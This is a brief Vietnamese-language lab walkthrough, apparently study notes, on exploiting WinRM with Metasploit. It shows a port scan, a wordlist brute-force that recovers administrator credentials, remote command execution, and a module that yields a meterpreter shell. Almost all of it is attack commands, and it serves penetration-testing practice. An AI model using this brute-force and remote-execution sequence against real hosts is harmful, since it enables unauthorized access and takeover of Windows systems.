# Exploiting WinRM (Windows Remote Management Protocol)

mở MSF

`db_nmap -sS -sV -O -p- 10.4.22.219`

-> ta thấy có port 5985 Microsoft HTTPAPI httpd 2.0 SSDP/UPnP

Xác thực xem có phải port 5985 đang chạy WinRM không:

`search type:auxiliary winrm`

`use auxiliary/scanner/winrm/winrm_auth_methods`

`set RHOSTS 10.4.22.219`

`run`

chuyển sang brute-force login 

`use auxiliary/scanner/winrm/winrm_login`

`set RHOSTS ip`

`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

`run`

-> ta nhận được `administrator:tinkerbell`

chạy command

`use auxiliary/scanner/winrm/winrm_cmd`

`set RHOSTS ip`

`set USERNAME administrator`

`set PASSWORD tinkerbell`

`set CMD whoami`

`run`

Sử dụng 1 module khác để có được phiên luôn:

`use exploit/windows/winrm/winrm_script_exec`

`set RHOSTS ip`

`set USERNAME administrator`

`set PASSWORD tinkerbell`

`set FORCE_VBS true`

`run`

-> chờ 1 lúc ta sẽ có phiên meterpreter












